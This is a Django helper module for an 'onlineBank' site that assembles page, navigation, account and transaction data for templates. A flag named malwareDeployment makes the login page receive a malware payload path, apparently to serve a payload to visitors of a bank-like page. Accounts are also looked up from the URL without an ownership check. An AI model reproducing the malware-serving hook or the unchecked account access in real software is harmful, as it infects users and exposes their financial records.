import os
import re
from onlineBank.models import MyFlatPage, MySite, account, transaction, MyFlatPage
from onlineBank.settings import NAVBAR_CONSTANTS

def createArgs(request):
    site = getSite(request)
    if site == None:
        return
    if site.template != None:
        outerTemplate = site.template.file.path
    else:
        outerTemplate = "template.html"
    if site.logo != None:
        logo = os.path.relpath(
            site.logo.file.url, '/onlineBank/static')
    else:
        logo = None

    if site.font != None:
        font = os.path.relpath(
            site.font.file.url, '/onlineBank/static')
        font = font.replace('.zip', '')
        font += '-regular'
    else:
        font = 'fonts/ubuntu-v19-latin-regular'

    pages = MyFlatPage.objects.all()
    footerContents = getFooterContents(pages)
    page = {}
    page["page_colour"] = "#FFFFFF"

    navbarContents = []

    userAccounts = []
    transactions = {}
    userAccount = ''
    
        #accounts = account.objects.all()
        #for bankAccount in accounts:
        #    if bankAccount.accountOwner.username == request.user.username:
        #        userAccounts.append(bankAccount)
    if re.match('^\/accounts\/[0-9]{8}', request.path):
        userAccount = account.objects.get(accountNumber=re.sub('^\/accounts\/', '', request.path))
        transactions = transaction.objects.filter(account=userAccount)
        transactions = list(transactions)
        transactions = sorted(transactions, key=lambda d: d.date)  #Sorts transactions by date.
        transactions.reverse()
    elif re.match('(^\/transfer\/|\/payment\/)[0-9]{8}', request.path):
        userAccount = account.objects.get(accountNumber=re.sub('(^\/transfer\/|\/payment\/)', '', request.path))
    
    if request.user.is_authenticated==True:
        userAccounts = list(account.objects.filter(accountOwner=request.user))
        if userAccount != '':
            userAccounts.remove(userAccount)

    if list(MyFlatPage.objects.filter(url=request.path)) != []:
        navbarContents = getNavBarContents(request, pages)
        page = list(MyFlatPage.objects.filter(url=request.path))[0]
    elif request.path == '/login/':
        navbarContents = getNavBarContents(request, pages)
    else:
        page = {'page_colour': '#FFFFFF', 'text_colour': '#000000'}
    
    args = {'navbarContents': navbarContents, 'footerContents': footerContents,
        'site': site, 'outerTemplate': outerTemplate, 'logo': logo, 'payingAccount': userAccount, 'flatpage': page, 'user': request.user, 'userAccounts': userAccounts, 'font': font, 'transactions': transactions, 'flatpage': page}
    
    if request.path=='/login/' and site.malwareDeployment==True:
        args['payloadPath'] = re.sub('^onlineBank\/static\/', '', site.malwareFile.name)

    return args


def getSite(request):
    currentSite = None
    sites = MySite.objects.all()
    requestSite = request._get_raw_host()
    for site in sites:
        if site.domain == requestSite:
            currentSite = site
    return currentSite


def getNavBarContents(request, pages):
    """Returns an array of dictionary objects containing the navbar contents"""
    navbarContents = []
    navbarContents += NAVBAR_CONSTANTS
    if request.user.is_authenticated == True:
        navbarContents.pop(0)
    else:
        navbarContents.pop(1)
    for page in pages:
        if page.appearOnNavbar == True:
            navbarContents.append({'name': page.title, 'url': page.url})
    return navbarContents


def getFooterContents(pages):
    """Returns an array of dictionary objects containing the footer contents"""
    footerContents = []
    for page in pages:
        if page.appearOnNavbar == True:
            footerContents.append({'name': page.title, 'url': page.url})
    return footerContents